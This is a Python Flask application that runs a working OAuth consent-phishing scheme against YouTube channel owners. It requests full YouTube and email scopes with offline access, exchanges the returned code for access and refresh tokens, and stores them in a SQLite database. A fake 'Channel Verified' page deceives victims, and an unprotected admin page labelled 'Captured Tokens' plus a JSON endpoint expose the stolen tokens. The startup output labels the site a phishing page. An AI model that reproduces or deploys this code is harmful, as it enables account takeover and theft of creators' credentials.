from flask import Flask, request, redirect, render_template, jsonify
import requests
import sqlite3
import os
import uuid
import base64
import hashlib
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI')

SCOPES = ' '.join([
    'https://www.googleapis.com/auth/youtube',
    'https://www.googleapis.com/auth/userinfo.email',
    'openid',
])

DB_FILE = os.path.join(os.path.dirname(__file__), 'data', 'tokens.db')

def init_db():
    os.makedirs(os.path.dirname(DB_FILE), exist_ok=True)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS tokens
        (id TEXT PRIMARY KEY, email TEXT, access_token TEXT,
         refresh_token TEXT, token_type TEXT, expiry INTEGER,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

def save_token(token_id, email, access_token, refresh_token, token_type, expiry):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO tokens VALUES (?,?,?,?,?,?, datetime("now"))',
              (token_id, email, access_token, refresh_token, token_type, expiry))
    conn.commit()
    conn.close()

@app.route('/')
def index():
    state = uuid.uuid4().hex
    nonce = uuid.uuid4().hex
    auth_url = (
        'https://accounts.google.com/o/oauth2/v2/auth?'
        f'client_id={CLIENT_ID}&'
        f'redirect_uri={REDIRECT_URI}&'
        f'response_type=code&'
        f'scope={SCOPES}&'
        f'state={state}&'
        f'nonce={nonce}&'
        f'access_type=offline&'
        f'prompt=consent'
    )
    return render_template('index.html', auth_url=auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    error = request.args.get('error')
    if error or not code:
        return f'Authorization failed: {error}', 400

    token_url = 'https://oauth2.googleapis.com/token'
    data = {
        'code': code,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'redirect_uri': REDIRECT_URI,
        'grant_type': 'authorization_code',
    }
    resp = requests.post(token_url, data=data)
    tokens = resp.json()

    if 'error' in tokens:
        return f'Token exchange failed: {tokens["error"]} - {tokens.get("error_description","")}', 400

    access_token = tokens['access_token']
    refresh_token = tokens.get('refresh_token', 'N/A')
    expires_in = tokens.get('expires_in', 3600)

    user_info = requests.get(
        'https://www.googleapis.com/oauth2/v2/userinfo',
        headers={'Authorization': f'Bearer {access_token}'}
    ).json()
    email = user_info.get('email', 'unknown')

    token_id = uuid.uuid4().hex[:12]
    save_token(token_id, email, access_token, refresh_token, 'Bearer', expires_in)

    return redirect(f'/success?id={token_id}')

@app.route('/success')
def success():
    token_id = request.args.get('id')
    return f'''
    <h2>Channel Verified Successfully</h2>
    <p>You can close this window and return to YouTube Studio.</p>
    <p style="color:#999;">Token ID: {token_id}</p>
    '''

@app.route('/admin')
def admin():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    rows = c.execute('SELECT id, email, created_at FROM tokens ORDER BY created_at DESC').fetchall()
    conn.close()
    html = '<h2>Captured Tokens</h2><table border=1><tr><th>ID</th><th>Email</th><th>Time</th></tr>'
    for r in rows:
        html += f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td></tr>'
    html += '</table>'
    return html

@app.route('/token/<token_id>')
def view_token(token_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    row = c.execute('SELECT * FROM tokens WHERE id=?', (token_id,)).fetchone()
    conn.close()
    if not row:
        return 'Not found', 404
    return jsonify({
        'id': row[0],
        'email': row[1],
        'access_token': row[2],
        'refresh_token': row[3],
        'token_type': row[4],
        'expiry': row[5],
        'created_at': row[6],
    })

if __name__ == '__main__':
    init_db()
    print(f'Server running on http://localhost:5000')
    print(f'Phishing page: http://localhost:5000/')
    print(f'View tokens:  http://localhost:5000/admin')
    app.run(host='0.0.0.0', port=5000, debug=True)
